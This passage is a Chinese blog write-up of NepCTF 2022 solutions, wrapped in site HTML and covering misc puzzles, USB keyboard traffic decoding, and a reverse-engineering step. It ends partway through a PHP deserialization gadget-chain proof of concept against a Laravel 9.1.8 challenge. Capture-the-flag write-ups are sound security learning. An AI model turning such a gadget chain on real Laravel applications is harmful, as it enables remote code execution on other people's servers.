@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+<script>
+(function(){
+    if(''){
+        if (prompt('请输入文章密码') !== ''){
+            alert('密码错误！');
+            history.back();
+        }
+    }
+})();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/aixin.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/aixin.png">
+  <link rel="mask-icon" href="/images/aixin.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
+  <script src="true"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideLeftIn"}},"path":"search.xml"};
+  </script>
+
+
+
+<script>
+(function(){
+var src = "https://s.ssl.qhres2.com/ssl/ab77b6ea7f3fbf79.js";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+
+
+
+
+<!-- title、keywords、desc关键字 -->
+
+  <title>分类</title>
+  <meta name="title" content="分类" />
+
+
+
+
+
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF 2022">
+<meta property="og:url" content="https://hzy2003628.top/2022/07/17/NepCTF/index.html">
+<meta property="og:site_name" content="风尘孤狼">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171311928.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171314613.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151849807.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151850888.jpg?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151852447.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151853959.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151854403.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171252266.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171253683.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171254237.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171255597.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152151343.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152248043.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171028032.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207162114733.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170946815.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152201977.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338523.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338293.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152340140.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207160057751.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152349502.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170936068.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170940483.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170940278.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171027968.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172247341.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172248135.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172250238.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172251053.png?x-oss-process=hzy">
+<meta property="article:published_time" content="2022-07-17T11:36:39.000Z">
+<meta property="article:modified_time" content="2022-07-20T09:16:51.077Z">
+<meta property="article:author" content="故里">
+<meta property="article:tag" content="赛后复盘">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171311928.png?x-oss-process=hzy">
+
+<link rel="canonical" href="https://hzy2003628.top/2022/07/17/NepCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NepCTF 2022 | 风尘孤狼</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1ea9671a278a2cb33e24c76d08af22f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">风尘孤狼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">知识型学习记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">90</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2022/07/17/NepCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="故里">
+      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风尘孤狼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NepCTF 2022
+        </h1>
+
+        <div class="post-meta">  
+		 
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-17 19:36:39" itemprop="dateCreated datePublished" datetime="2022-07-17T19:36:39+08:00">2022-07-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-20 17:16:51" itemprop="dateModified" datetime="2022-07-20T17:16:51+08:00">2022-07-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">赛后复盘</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/07/17/NepCTF/" class="post-meta-item leancloud_visitors" data-flag-title="NepCTF 2022" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/07/17/NepCTF/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/07/17/NepCTF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>30k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>28 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171311928.png?x-oss-process=hzy" alt="image-20220717131146861"></p>
+<span id="more"></span>
+<h1 id="前言">前言</h1>
+<p>打了三天的NepCTF，还是有收获的，都是挺有意思的题目，终究是我太菜，师傅们都太卷了，敌不过你们</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171314613.png?x-oss-process=hzy" alt="image-20220717131457543"></p>
+<h1 id="misc">misc</h1>
+<h2 id="花花画画画花花">花花画画画花花</h2>
+<blockquote>
+<p>花花画了一张图，你能看出来她画的是什么吗</p>
+</blockquote>
+<p>下载附件发现是.osz文件，是 <code>osu!</code> 的一个谱面压缩文件，下载osu!软件然后附件拖进去</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151849807.png?x-oss-process=hzy" alt="image-20220715184927423"></p>
+<p>启动osu!，进入到edit模式，一点一点放，这里放个图吧</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151850888.jpg?x-oss-process=hzy" alt="img"></p>
+<p>最后拼接一下就是flag</p>
+<p>NepCTF{MASTER_OF_坏女人！}</p>
+<h2 id="签到题">签到题</h2>
+<blockquote>
+<p>极限套娃</p>
+</blockquote>
+<p>附件就是套娃，刚开始出的那个套一半就卡住了，后来主办方降低难度了，新的附件有思路，就是简单的套娃</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151852447.png?x-oss-process=hzy" alt="image-20220715185253401"></p>
+<p>解压脚本如下</p>
+<pre><code class="hljs plaintext">import zipfile
+import re
+
+zipname = &quot;C:\\Users\\25963\\Desktop\\新\\xxx\\232\\231\\&quot;+&quot;230.zip&quot;
+
+while True:
+    if zipname[len(zipname)-4:] == &quot;.zip&quot;:
+        pzip = zipfile.ZipFile(zipname)
+        res = re.search(&#x27;[0-9]*&#x27;,pzip.namelist()[0])
+        print(res.group())
+        password = res.group()
+        password = password.encode(&#x27;ascii&#x27;)
+        pzip.extractall(&quot;D:\\developer\\python_shell\\zip&quot;,pwd=password)
+        zipname = &quot;D:\\developer\\python_shell\\zip\\&quot;+pzip.namelist()[0]
+    else:
+        print(&quot;end&quot;)</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151853959.png?x-oss-process=hzy" alt="image-20220715185354913"></p>
+<p>发现是伪加密，直接用winrar修复</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151854403.png?x-oss-process=hzy" alt="image-20220715185440337"></p>
+<p>流量分析发现是usb流量</p>
+<p>筛选流量</p>
+<pre><code class="hljs plaintext">usb.transfer_type == 0x01 and usb.src == &quot;1.5.1&quot;</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171252266.png?x-oss-process=hzy" alt="image-20220717125234184"></p>
+<p>导出之后上kali</p>
+<pre><code class="hljs plaintext">tshark -r 2.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171253683.png?x-oss-process=hzy" alt="image-20220717125332637"></p>
+<p>利用脚本加上冒号</p>
+<pre><code class="hljs plaintext">f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)
+fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)
+while 1:
+    a=f.readline().strip()
+    if a:
+        if len(a)==16: # 键盘流量len=16，鼠标流量len=8
+            out=&#x27;&#x27;
+            for i in range(0,len(a),2):
+                if i+2 != len(a):
+                    out+=a[i]+a[i+1]+&quot;:&quot;
+                else:
+                    out+=a[i]+a[i+1]
+            fi.write(out)
+            fi.write(&#x27;\n&#x27;)
+    else:
+        break
+
+fi.close()</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171254237.png?x-oss-process=hzy" alt="image-20220717125428182"></p>
+<p>键盘流量上脚本</p>
+<pre><code class="hljs plaintext">normalKeys = &#123;
+    &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;,
+    &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;,
+     &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;,
+      &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;,
+       &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;,
+        &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;,
+         &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,
+         &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,
+         &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,
+         &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,
+         &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,
+         &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,
+         &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
+shiftKeys = &#123;
+    &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;,
+     &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;,
+      &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;,
+       &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;,
+        &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;,
+         &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;,
+          &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,
+          &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,
+          &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,
+          &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,
+          &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,
+          &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
+output = []
+keys = open(&#x27;out.txt&#x27;)
+for line in keys:
+    try:
+        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:
+             continue
+        if line[6:8] in normalKeys.keys():
+            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]
+        else:
+            output += [&#x27;[unknown]&#x27;]
+    except:
+        pass
+
+keys.close()
+
+flag=0
+print(&quot;&quot;.join(output))
+for i in range(len(output)):
+    try:
+        a=output.index(&#x27;&lt;DEL&gt;&#x27;)
+        del output[a]
+        del output[a-1]
+    except:
+        pass
+
+for i in range(len(output)):
+    try:
+        if output[i]==&quot;&lt;CAP&gt;&quot;:
+            flag+=1
+            output.pop(i)
+            if flag==2:
+                flag=0
+        if flag!=0:
+            output[i]=output[i].upper()
+    except:
+        pass
+
+print (&#x27;output :&#x27; + &quot;&quot;.join(output))</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171255597.png?x-oss-process=hzy" alt="image-20220717125520549"></p>
+<p>nepctf{welcometonepctf2nd}</p>
+<h2 id="9点直播">9点直播</h2>
+<p>老老实实看直播，听出题人说有多么简单，然后拿到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152151343.png?x-oss-process=hzy" alt="image-20220715215119009"></p>
+<p>NepCTF{bad_woman_nb!}</p>
+<h2 id="少见的bbbbase">少见的bbbbase</h2>
+<blockquote>
+<p>少见的bbbbase</p>
+</blockquote>
+<p>附件是个jpg，用Jphswin，无密码，直接导出base加密的flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152248043.png?x-oss-process=hzy" alt="image-20220715224825979"></p>
+<p>base58解码得到明文flag</p>
+<p>flag{Real_qiandao~}</p>
+<h2 id="馅饼陷阱">馅饼？陷阱！</h2>
+<blockquote>
+<p>好兄弟中奖了，但是要先汇款。他去哪了？</p>
+<p>NepCTF{银行官网网址}</p>
+</blockquote>
+<p>有一个车牌号琼，是海南省</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171028032.png?x-oss-process=hzy" alt="image-20220717102824970"></p>
+<p>结合东北饺子城，百度地图搜索得到对面就是那个银行</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207162114733.png?x-oss-process=hzy" alt="image-20220716211423856"></p>
+<p>银行是光大银行</p>
+<p>NepCTF{<a target="_blank" rel="noopener" href="http://www.cebbank.com">www.cebbank.com</a>}</p>
+<h2 id="问卷">问卷</h2>
+<p>填问卷给flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170946815.png?x-oss-process=hzy" alt="image-20220717094619764"></p>
+<p>NepCTF{see_you_NepCTF_2023}</p>
+<h1 id="re">re</h1>
+<h2 id="快来签到">快来签到</h2>
+<p>下载附件，ida32，打开之后修改最大节点数为9999，得到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152201977.png?x-oss-process=hzy" alt="image-20220715220158915"></p>
+<p>NepCTF{welc0me_t0_nepctf}</p>
+<h1 id="web">web</h1>
+<h2 id="just-kidding">Just Kidding</h2>
+<blockquote>
+<p>顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338523.png?x-oss-process=hzy" alt="image-20220715233829454"></p>
+<p>没发现啥，www.zip是源码泄露，链子是Laravel 9.1.8</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338293.png?x-oss-process=hzy" alt="image-20220715233815201"></p>
+<p>反序列化漏洞，poc如下</p>
+<pre><code class="hljs plaintext">&lt;?php
+
+namespace Faker &#123;
+    class Generator &#123;
+        protected $providers = [];
+        protected $formatters = [];
+        function __construct() &#123;
+            $this-&gt;formatter = &quot;dispatch&quot;;
+            $this-&gt;formatters = 9999;
+        &#125;
+    &#125;
+&#125;
+
+namespace Illuminate\Broadcasting &#123;
+    class PendingBroadcast &#123;
+        public function __construct() &#123;
